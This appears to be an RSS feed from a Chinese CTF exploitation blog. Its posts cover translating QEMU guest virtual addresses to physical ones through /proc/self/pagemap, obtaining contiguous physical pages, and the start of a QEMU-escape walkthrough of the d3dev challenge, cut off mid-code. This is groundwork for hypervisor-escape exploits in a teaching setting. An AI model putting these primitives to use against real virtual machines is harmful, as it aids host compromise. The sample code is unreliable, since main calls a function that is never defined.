<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
<channel>
  <title>Mark's Blog</title>
  <atom:link href="https://blog.mark0519.com/#//feed.xml" rel="self" type="application/rss+xml" />
  <link>https://blog.mark0519.com/#/</link>
  <description>Live long and Pwn</description>
   
  <item>
    <title><![CDATA[虚拟地址到物理地址]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221108-gva2gpa</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221108-gva2gpa</guid>
    <description><![CDATA[<h1 id="虚拟地址到物理地址">虚拟地址到物理地址</h1>
<h1 id="x00-开始之前">0x00 开始之前</h1>
<p>先前看一个<a href="https://blog.mark0519.com/#/pwnable/221025-qemu-basic?id=_0x02-hws2021-fastcp">qemu逃逸题</a>遇到:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1">cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="dv">8</span> * v9, &amp;cp_info, <span class="bn">0x18</span><span class="bu">uLL</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-2" title="2">cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-3" title="3">cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="dv">1</span>);</a></code></pre></div>
<p>主要是第一次遇到这个函数：<strong>cpu_physical_memory_rw()</strong></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1"><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</a>
<a class="sourceLine" id="cb2-2" title="2">                            hwaddr len, <span class="dt">bool</span> is_write);</a>
<a class="sourceLine" id="cb2-3" title="3"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</a>
<a class="sourceLine" id="cb2-4" title="4">                                            <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb2-5" title="5">{</a>
<a class="sourceLine" id="cb2-6" title="6">    cpu_physical_memory_rw(addr, buf, len, false);</a>
<a class="sourceLine" id="cb2-7" title="7">}</a>
<a class="sourceLine" id="cb2-8" title="8"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</a>
<a class="sourceLine" id="cb2-9" title="9">                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb2-10" title="10">{</a>
<a class="sourceLine" id="cb2-11" title="11">    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</a>
<a class="sourceLine" id="cb2-12" title="12">}</a></code></pre></div>
<p>也就是说:</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``false``)</a></code></pre></div>
<p>把物理地址hwaddr addr上的内容复制到虚拟地址void *buf上</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``true``)</a></code></pre></div>
<p>把虚拟地址void *buf的内容复制到物理地址hwaddr addr上</p>
<p>这就牵扯到了我们需要根据虚拟地址计算物理地址的问题</p>
<h1 id="x01-qemu内存概述">0x01 qemu内存概述</h1>
<h2 id="qemu-内存布局">1. qemu 内存布局</h2>
<p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如 CPU 线程、I/O 线程等）对应 qemu 进程的一个线程。</p>
<figure>
<img src="https://jjuku29a1d.feishu.cn/space/api/box/stream/download/asynccode/?code=ODNjYjQ4ZDY5NDcxNGU2ZDNhNjdiMWFjZjNmZGRjYTVfZ3paa1pBc09aWFcwT0xpME5ITkVHOVVrOUowelcyOExfVG9rZW46Ym94Y25KUzF3eGQ0Yk53TGNxV2F6aFNIcDRkXzE2Njc5MTY2MTk6MTY2NzkyMDIxOV9WNA" alt="img" /><figcaption>img</figcaption>
</figure>
<p>也就是说，对于qemu来说，地址映射具体为：</p>
<p>GVA(虚拟机虚拟地址) -&gt; GPA(虚拟机物理地址) -&gt; HVA(宿主机虚拟地址) -&gt; HPA(宿主机物理地址)</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" title="1">                        Guest&#39; processes</a>
<a class="sourceLine" id="cb5-2" title="2">                     +--------------------+</a>
<a class="sourceLine" id="cb5-3" title="3">Virtual addr space   |                    |</a>
<a class="sourceLine" id="cb5-4" title="4">                     +--------------------+</a>
<a class="sourceLine" id="cb5-5" title="5">                     |                    |</a>
<a class="sourceLine" id="cb5-6" title="6">                     \__   Page Table     \__</a>
<a class="sourceLine" id="cb5-7" title="7">                        \                    \</a>
<a class="sourceLine" id="cb5-8" title="8">                         |                    |  Guest kernel</a>
<a class="sourceLine" id="cb5-9" title="9">                    +----+--------------------+----------------+</a>
<a class="sourceLine" id="cb5-10" title="10">Guest&#39;s phy. memory |    |                    |                |</a>
<a class="sourceLine" id="cb5-11" title="11">                    +----+--------------------+----------------+</a>
<a class="sourceLine" id="cb5-12" title="12">                    |                                          |</a>
<a class="sourceLine" id="cb5-13" title="13">                    \__                                        \__</a>
<a class="sourceLine" id="cb5-14" title="14">                       \                                          \</a>
<a class="sourceLine" id="cb5-15" title="15">                        |             QEMU process                 |</a>
<a class="sourceLine" id="cb5-16" title="16">                   +----+------------------------------------------+</a>
<a class="sourceLine" id="cb5-17" title="17">Virtual addr space |    |                                          |</a>
<a class="sourceLine" id="cb5-18" title="18">                   +----+------------------------------------------+</a>
<a class="sourceLine" id="cb5-19" title="19">                   |                                               |</a>
<a class="sourceLine" id="cb5-20" title="20">                    \__                Page Table                   \__</a>
<a class="sourceLine" id="cb5-21" title="21">                       \                                               \</a>
<a class="sourceLine" id="cb5-22" title="22">                        |                                               |</a>
<a class="sourceLine" id="cb5-23" title="23">                   +----+-----------------------------------------------++</a>
<a class="sourceLine" id="cb5-24" title="24">Physical memory    |    |                                               ||</a>
<a class="sourceLine" id="cb5-25" title="25">                   +----+-----------------------------------------------++</a></code></pre></div>
<p>需要注意的是，虽然上图看起来虚拟地址到物理地址的映射是连续的，但实际上并不是。</p>
<p>对于QEMU来说，一个内存页的大小是0x1000，如果我们使用mmap申请一个0x2000大小的空间，那么他们的虚拟地址确实是连续的，但是物理地址页并不一定连续。</p>
<ol type="1">
<li><h2 id="申请连续物理内存的两种方式">申请连续物理内存的两种方式</h2></li>
<li><h3 id="爆破">爆破</h3></li>
</ol>
<blockquote>
<p>多次申请直到物理内存连续</p>
</blockquote>
<p>字面意思，多次mmap 0x1000大小的内存，并根据虚拟地址计算物理地址，一直到出现两个连续的物理内存页。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1"><span class="dt">size_t</span> buf0, buf1;</a>
<a class="sourceLine" id="cb6-2" title="2"></a>
<a class="sourceLine" id="cb6-3" title="3"><span class="dt">void</span> get_pages()</a>
<a class="sourceLine" id="cb6-4" title="4">{</a>
<a class="sourceLine" id="cb6-5" title="5">    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb6-6" title="6">    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb6-7" title="7">    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-8" title="8">    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb6-9" title="9">    <span class="dt">int</span> n = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb6-10" title="10">    buf[n] = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb6-11" title="11">    arry[n++] = arr;</a>
<a class="sourceLine" id="cb6-12" title="12">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</a>
<a class="sourceLine" id="cb6-13" title="13">    {</a>
<a class="sourceLine" id="cb6-14" title="14">        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-15" title="15">        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb6-16" title="16">        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb6-17" title="17">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</a>
<a class="sourceLine" id="cb6-18" title="18">        {</a>
<a class="sourceLine" id="cb6-19" title="19">            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</a>
<a class="sourceLine" id="cb6-20" title="20">            {</a>
<a class="sourceLine" id="cb6-21" title="21">                LOG(<span class="st">&quot;consist pages&quot;</span>);</a>
<a class="sourceLine" id="cb6-22" title="22">                <span class="cf">if</span> (fn &gt; buf[j])</a>
<a class="sourceLine" id="cb6-23" title="23">                {</a>
<a class="sourceLine" id="cb6-24" title="24">                    buf0 = arry[j];</a>
<a class="sourceLine" id="cb6-25" title="25">                    buf1 = arr;</a>
<a class="sourceLine" id="cb6-26" title="26">                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb6-27" title="27">                }</a>
<a class="sourceLine" id="cb6-28" title="28">                <span class="cf">else</span></a>
<a class="sourceLine" id="cb6-29" title="29">                {</a>
<a class="sourceLine" id="cb6-30" title="30">                    buf1 = arry[j];</a>
<a class="sourceLine" id="cb6-31" title="31">                    buf0 = arr;</a>
<a class="sourceLine" id="cb6-32" title="32">                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb6-33" title="33">                }</a>
<a class="sourceLine" id="cb6-34" title="34">                <span class="cf">return</span>;</a>
<a class="sourceLine" id="cb6-35" title="35">            }</a>
<a class="sourceLine" id="cb6-36" title="36">        }</a>
<a class="sourceLine" id="cb6-37" title="37">        buf[n] = fn;</a>
<a class="sourceLine" id="cb6-38" title="38">        arry[n++] = arr;</a>
<a class="sourceLine" id="cb6-39" title="39">    }</a>
<a class="sourceLine" id="cb6-40" title="40">}</a></code></pre></div>
<h2 id="申请linux大页">2. 申请linux大页</h2>
<blockquote>
<p>主动申请连续物理地址</p>
</blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1055041">Linux申请大页内存(mmap)</a></p>
<p>操作系统对内存采用多级页表和分页进行管理，操作系统每个页默认大小为4KB（0x1000）。</p>
<p>如果进程使用的内存过大，比如1GB，这样会在页表中占用 1GB / 4KB = 262144个页表项，而系统TLB可以容纳的页表项远小于这个数量。当多个内存密集型应用访问内存时，会造成过多的TLB未命中，因此在特定情况下会需要减少未命中次数，一个可行的办法就是增大每个页的尺寸。</p>
<p>操作系统默认支持的大页是2MB（512 * 0x1000 ），当使用1GB内存时，在页表中将占用 1GB / 2MB = 512个页表项，可以大大提升TLB命中率，进而提升应用性能。</p>
<blockquote>
<p>申请后还需访存一下，这里使用了memset，确保物理页被真实映射。</p>
</blockquote>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb7-1" title="1">system(<span class="st">&quot;sysctl vm.nr_hugepages=30&quot;</span>); <span class="co">// 开启大页</span></a>
<a class="sourceLine" id="cb7-2" title="2"><span class="dt">void</span> * buf = mmap(<span class="dv">0</span>, <span class="dv">512</span> * <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS | <span class="bn">0x40000</span>, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb7-3" title="3">memset(buf,<span class="ch">&#39;a&#39;</span>,<span class="bn">0x2000</span>);</a></code></pre></div>
<h1 id="x02-gva2gpa">0x02 GVA2GPA</h1>
<h2 id="原理">1. 原理</h2>
<p>将虚拟地址转换为物理地址需要访问页表，然而只有内核态的程序才能访问到页表，用户态程序无权访问。此外，Linux 系统提供了一种用户态程序访问页表的方式，通过查看 <code>/proc/pid/pagemap</code> 文件可得到虚拟内存页映射与物理内存页的映射关系。显然后者更为简单，所以下面使用该方法实现地址转换。</p>
<p>根据内核文档可知，每个虚拟页在 <code>/proc/pid/pagemap</code> 中对应一项长度为 64 bits 的数据，其中 Bit 63 为 page present，表示物理内存页是否已存在；若物理页已存在，则 Bits 0-54 表示物理页号。此外，需要 root 权限的进程才能读取 <code>/proc/pid/pagemap</code> 中的内容。</p>
<blockquote>
<p>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow userspace programs to examine the page tables and related information by reading files in /proc.</p>
<p>There are four components to pagemap:</p>
<p>*/proc/pid/pagemap. This file lets a userspace process find out which physical frame each virtual page is mapped to. It contains one 64-bit value for each virtual page, containing the following data (from fs/proc/task_mmu.c, above pagemap_read):</p>
<p>* Bits 0-54 page frame number (PFN) if present</p>
<p>* Bits 0-4 swap type if swapped</p>
<p>* Bits 5-54 swap offset if swapped</p>
<p>* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</p>
<p>* Bit 56 page exclusively mapped (since 4.2)</p>
<p>* Bits 57-60 zero</p>
<p>* Bit 61 page is file-page or shared-anon (since 3.5)</p>
<p>* Bit 62 page swapped</p>
<p>* Bit 63 page present</p>
<p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs. In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from 4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN. Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p>
</blockquote>
<p>根据以上信息，利用 <code>/proc/pid/pagemap</code> 可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1）计算虚拟地址所在虚拟页对应的数据项在 <code>/proc/pid/pagmap</code> 中的偏移；</p>
<pre><code>offset = (viraddr / pagesize) * sizeof(uint64_t)</code></pre>
<p>2）读取长度为 64 bits 的数据项；</p>
<p>3）根据 Bit 63 判断物理内存页是否存在；</p>
<p>4）若物理内存页已存在，则取 bits 0 - 54 作为物理页号；</p>
<p>5）计算出物理页起始地址加上页内偏移即得到物理地址；</p>
<pre><code>phyaddr = pageframenum * pagesize + viraddr % pagesize;</code></pre>
<h2 id="实现">2.实现</h2>
<p>具体实现代码如下：</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span><span class="pp">      </span></a>
<a class="sourceLine" id="cb10-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb10-3" title="3"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb10-4" title="4"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb10-5" title="5"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb10-6" title="6">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb10-7" title="7"></a>
<a class="sourceLine" id="cb10-8" title="8">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb10-9" title="9">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb10-10" title="10">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb10-11" title="11">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-12" title="12">    }</a>
<a class="sourceLine" id="cb10-13" title="13"></a>
<a class="sourceLine" id="cb10-14" title="14">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb10-15" title="15">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb10-16" title="16"></a>
<a class="sourceLine" id="cb10-17" title="17">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb10-18" title="18">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb10-19" title="19">        close(fd);</a>
<a class="sourceLine" id="cb10-20" title="20">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-21" title="21">    }</a>
<a class="sourceLine" id="cb10-22" title="22"></a>
<a class="sourceLine" id="cb10-23" title="23">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb10-24" title="24">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb10-25" title="25">        close(fd);</a>
<a class="sourceLine" id="cb10-26" title="26">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-27" title="27">    }</a>
<a class="sourceLine" id="cb10-28" title="28"></a>
<a class="sourceLine" id="cb10-29" title="29">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb10-30" title="30">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb10-31" title="31">        close(fd);</a>
<a class="sourceLine" id="cb10-32" title="32">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-33" title="33">    }</a>
<a class="sourceLine" id="cb10-34" title="34"></a>
<a class="sourceLine" id="cb10-35" title="35">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb10-36" title="36">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb10-37" title="37"></a>
<a class="sourceLine" id="cb10-38" title="38">    close(fd);</a>
<a class="sourceLine" id="cb10-39" title="39"></a>
<a class="sourceLine" id="cb10-40" title="40">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb10-41" title="41">}</a>
<a class="sourceLine" id="cb10-42" title="42"><span class="dt">int</span> main()</a>
<a class="sourceLine" id="cb10-43" title="43">{</a>
<a class="sourceLine" id="cb10-44" title="44">    <span class="dt">size_t</span> phyaddr;</a>
<a class="sourceLine" id="cb10-45" title="45">    <span class="dt">size_t</span> viraddr;</a>
<a class="sourceLine" id="cb10-46" title="46">    <span class="dt">uint32_t</span> pid;</a>
<a class="sourceLine" id="cb10-47" title="47">    printf(<span class="st">&quot;pid = &quot;</span>);</a>
<a class="sourceLine" id="cb10-48" title="48">    scanf(<span class="st">&quot;%u&quot;</span>, &amp;pid);</a>
<a class="sourceLine" id="cb10-49" title="49">    printf(<span class="st">&quot;virtual address = &quot;</span>);</a>
<a class="sourceLine" id="cb10-50" title="50">    scanf(<span class="st">&quot;%x&quot;</span>, &amp;viraddr);</a>
<a class="sourceLine" id="cb10-51" title="51">    phyaddr = virtual_to_physical(pid, viraddr);</a>
<a class="sourceLine" id="cb10-52" title="52">    printf(<span class="st">&quot;virtual address = %p,physical address = %p</span><span class="sc">\n</span><span class="st">&quot;</span>, viraddr, phyaddr);</a>
<a class="sourceLine" id="cb10-53" title="53">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-54" title="54">}</a></code></pre></div>
<h1 id="x03-参考连接">0x03 参考连接</h1>
<p>https://blog.mark0519.com/#/pwnable/221025-qemu-basic</p>
<p>http://0x4c43.cn/2018/0508/linux-dynamic-link/</p>
<p>https://juniorprincewang.github.io/2018/07/20/qemu-memory/</p>
<p>https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0</p>
<p>https://www.anquanke.com/post/id/256977#h3-3</p>
<p>http://a1ex.online/2021/10/13/%E4%BB%8Eqemu%E9%80%83%E9%80%B8%E5%88%B0%E9%80%83%E8%B7%91/</p>]]></description>
    <pubDate>Sun, 13 Nov 2022 21:52:48 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[Pwnable]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/README</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/README</guid>
    <description><![CDATA[<h1 id="pwnable">Pwnable</h1>
<blockquote>
<p>纸上得来终觉浅，绝知此事要躬行。</p>
</blockquote>
<h2 id="tsctf-2022">TSCTF 2022</h2>
<ul>
<li><strong>[22/4/25]</strong> <a href="/pwnable/220425-tsctf2022">TSCTF 2022</a></li>
</ul>
<h2 id="kernel-学习">Kernel 学习</h2>
<ul>
<li><strong>[22/04/27]</strong> <a href="/pwnable/220427-kernel-basic">kernel basic</a></li>
<li><strong>[220/4/28]</strong> <a href="/pwnable/220428-kernel-rop1">kernel ROP1</a></li>
<li><strong>[22/04/29]</strong> <a href="/pwnable/220429-kernel-rop2">kernel ROP2</a></li>
<li><strong>[22/05/01]</strong> <a href="/pwnable/220501-kernel-rop3">kernel ROP3</a></li>
<li><strong>[22/05/02]</strong> <a href="/pwnable/220502-kernel-rop4">kernel ROP4</a></li>
</ul>
<h2 id="qemu逃逸">QEMU逃逸</h2>
<ul>
<li><strong>[22/10/25]</strong> <a href="/pwnable/221025-qemu-basic">Qemu basic</a></li>
<li><strong>[22/11/08]</strong> <a href="/pwnable/221108-gva2gpa">Gva2Gpa</a></li>
</ul>
<h2 id="刷题">刷题</h2>
<ul>
<li><p><strong>[22/05/18]</strong> <a href="/pwnable/220518-HTB1">HackTheBox 1</a></p></li>
<li><p><strong>[22/05/19]</strong> <a href="/pwnable/220519-HTB2">HackTheBox 2</a></p></li>
</ul>
<h2 id="house-of-xxx">House of xxx</h2>
<ul>
<li><strong>[22/05/26]</strong> <a href="/pwnable/220526-house_of_emma">House of Emma</a></li>
<li><strong>[22/07/66]</strong> <a href="/pwnable/220716-house_of_apple">House of Apple</a></li>
</ul>
<h2 id="总结">总结</h2>
<ul>
<li><strong>[22/07/03]</strong> <a href="/pwnable/2200703-glibc-233UAF">Glibc-2.33UAF利用</a></li>
</ul>]]></description>
    <pubDate>Tue, 8 Nov 2022 22:15:20 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[一、QEMU逃逸  --  basic ]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221025-qemu-basic</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221025-qemu-basic</guid>
    <description><![CDATA[<h1 id="一qemu逃逸-basic">一、QEMU逃逸 – basic</h1>
<blockquote>
<p><del>玩不懂kernel的菜鸡来霍霍qemu辣</del></p>
</blockquote>
<h2 id="x00-lspci">0x00 lspci</h2>
<p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分3位表示功能号。下面是<code>lspci</code>的输出，其中<code>pci</code>设备的地址，在最头部给出，由于<code>pc</code>设备总只有一个0号域，所以会省略域。</p>
<figure>
<img src="https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v -t</code>会用树状图的形式输出pci设备，会显得更加直观</p>
<figure>
<img src="https://p2.ssl.qhimg.com/t0106de490068b32c99.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v</code>就能输出设备的详细信息</p>
<figure>
<img src="https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>仔细观察相关的输出，可以从中知道<code>mmio</code>的地址是<code>0xfebf1000</code>，<code>pmio</code>的端口是<code>0xc050</code>。</p>
<figure>
<img src="https://p1.ssl.qhimg.com/t0129b36299082dc698.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p>
<figure>
<img src="https://p3.ssl.qhimg.com/t01ddba05509f456110.png" alt="image" /><figcaption>image</figcaption>
</figure>
<figure>
<img src="https://p0.ssl.qhimg.com/t016c20a809c748def6.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>每个设备的目录下<code>resource0</code> 对应<code>MMIO</code>空间。<code>resource1</code> 对应<code>PMIO</code>空间。 <code>resource</code>文件里面会记录相关的数据，第一行就是<code>mimo</code>的信息，从左到右是：起始地址、结束地址、标识位。</p>
<h2 id="x01-antctf-2021-d3dev">0x01 AntCTF 2021 d3dev</h2>
<h3 id="分析">1. 分析</h3>
<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb1-1" title="1"><span class="co">#!/bin/sh</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="ex">./qemu-system-x86_64</span> \</a>
<a class="sourceLine" id="cb1-3" title="3">-L pc-bios/ \</a>
<a class="sourceLine" id="cb1-4" title="4">-m 128M \</a>
<a class="sourceLine" id="cb1-5" title="5">-kernel vmlinuz \</a>
<a class="sourceLine" id="cb1-6" title="6">-initrd rootfs.img \</a>
<a class="sourceLine" id="cb1-7" title="7">-smp 1 \</a>
<a class="sourceLine" id="cb1-8" title="8">-append <span class="st">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</a>
<a class="sourceLine" id="cb1-9" title="9">-device d3dev \</a>
<a class="sourceLine" id="cb1-10" title="10">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</a>
<a class="sourceLine" id="cb1-11" title="11">-nographic \</a>
<a class="sourceLine" id="cb1-12" title="12">-monitor /dev/null</a></code></pre></div>
<p>启动脚本中出现<code>-device d3dev</code></p>
<p>使用IDA pro反汇编qemu，查找d3dev</p>
<p>在<code>d3dev_class_init()</code>函数中找到注册了PCI设备d3dev</p>
<p>其中</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1">  LODWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x11E82333</span>;</a>
<a class="sourceLine" id="cb2-2" title="2">  BYTE4(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x10</span>;</a>
<a class="sourceLine" id="cb2-3" title="3">  HIWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0xFF</span>;</a></code></pre></div>
<p>可以知道d3dev设备的Device id（0x11E8）和Vendor id（0x2333）</p>
<p>之后在<code>pci_d3dev_realize()</code>函数中可以找到该设备MMIO和PMIO的读写操作函数，且MMIO的内存大小为0x800，PMIO的内存大小为0x20，在读写的时候如果访问的地址在其范围内则会调用相关的读写函数</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"><span class="dt">void</span> __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)</a>
<a class="sourceLine" id="cb3-2" title="2">{</a>
<a class="sourceLine" id="cb3-3" title="3">  memory_region_init_io(</a>
<a class="sourceLine" id="cb3-4" title="4">    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>],</a>
<a class="sourceLine" id="cb3-5" title="5">    &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb3-6" title="6">    &amp;d3dev_mmio_ops,</a>
<a class="sourceLine" id="cb3-7" title="7">    pdev,</a>
<a class="sourceLine" id="cb3-8" title="8">    <span class="st">&quot;d3dev-mmio&quot;</span>,</a>
<a class="sourceLine" id="cb3-9" title="9">    <span class="bn">0x800</span><span class="bu">uLL</span>);</a>
<a class="sourceLine" id="cb3-10" title="10">  pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>]);</a>
<a class="sourceLine" id="cb3-11" title="11">  memory_region_init_io(</a>
<a class="sourceLine" id="cb3-12" title="12">    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>],</a>
<a class="sourceLine" id="cb3-13" title="13">    &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb3-14" title="14">    &amp;d3dev_pmio_ops,</a>
<a class="sourceLine" id="cb3-15" title="15">    pdev,</a>
<a class="sourceLine" id="cb3-16" title="16">    <span class="st">&quot;d3dev-pmio&quot;</span>,</a>
<a class="sourceLine" id="cb3-17" title="17">    <span class="bn">0x20</span><span class="bu">uLL</span>);</a>
<a class="sourceLine" id="cb3-18" title="18">  pci_register_bar(pdev, <span class="dv">1</span>, <span class="dv">1</span><span class="bu">u</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>]);</a>
